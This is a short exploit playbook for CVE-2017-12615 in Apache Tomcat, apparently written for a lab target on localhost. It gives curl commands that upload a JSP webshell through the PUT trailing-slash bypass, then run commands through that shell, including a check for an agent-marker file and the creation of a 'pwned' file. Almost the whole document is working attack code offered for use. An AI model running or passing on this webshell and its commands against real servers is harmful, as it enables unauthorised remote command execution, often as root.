# Tomcat Exploit Playbook

**CVE**: CVE-2017-12615 (PUT method file upload to RCE)
**Target**: http://localhost:8082
**Vulnerability**: HTTP PUT file upload with trailing-slash bypass
**Authentication**: None required

## Detection

Upload a test JSP file to confirm PUT is enabled:

```bash
curl -s -o /dev/null -w "%{http_code}" -X PUT 'http://localhost:8082/test.jsp/' -d '<% out.println("VULN");%>'
```

Expected: HTTP 201 or 200. Then verify the file:

```bash
curl -s 'http://localhost:8082/test.jsp'
```

Expected: `VULN` in response body.

## RCE Payload — JSP Webshell Upload

```bash
curl -X PUT 'http://localhost:8082/shell.jsp/' -d '<%@ page import="java.io.*" %><% String c = request.getParameter("c"); Process p = Runtime.getRuntime().exec(c); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); %>'
```

Then execute commands:

```bash
curl 'http://localhost:8082/shell.jsp?c=id'
```

## Exploit Mechanism

| Step | Action | Detail |
|------|--------|--------|
| 1 | PUT /shell.jsp/ | Trailing `/` bypasses `.jsp` extension check |
| 2 | Tomcat saves `shell.jsp` | Path normalization strips trailing `/` |
| 3 | GET /shell.jsp | Tomcat compiles and executes JSP |
| 4 | `c` parameter | Command passed to `Runtime.exec()` |

## Validation (3-Layer)

```bash
# L1 — Marker file absence
curl 'http://localhost:8082/shell.jsp?c=[ ! -f /tmp/agent_is_present ] && echo L1_PASS || echo L1_FAIL'

# L2 — Environment fingerprint
curl 'http://localhost:8082/shell.jsp?c=ip a'

# L3 — Unique artifact
curl 'http://localhost:8082/shell.jsp?c=touch /tmp/pwned_$(date +%s_%N)'
```

## Notes

- Tomcat 8.5.19 with `readonly=false` in DefaultServlet config
- The webshell persists until the container is reset
- Commands run as `root` inside the Tomcat container
